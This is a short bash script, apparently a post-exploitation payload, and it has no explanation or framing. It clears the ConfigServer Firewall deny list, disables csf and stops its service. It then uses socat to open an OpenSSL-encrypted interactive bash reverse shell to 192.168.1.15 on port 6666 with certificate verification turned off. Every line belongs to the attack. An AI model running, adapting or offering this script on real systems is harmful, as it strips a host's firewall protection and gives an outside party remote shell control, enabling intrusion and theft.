#!/bin/bash
$(which cat) /dev/null > /etc/csf/csf.deny
$(which csf) -x & wait
$(which systemctl) stop csf.service & wait
$(which socat) exec:'bash -li',pty,stderr,setsid,sigint,sane OPENSSL:192.168.1.15:6666,verify=0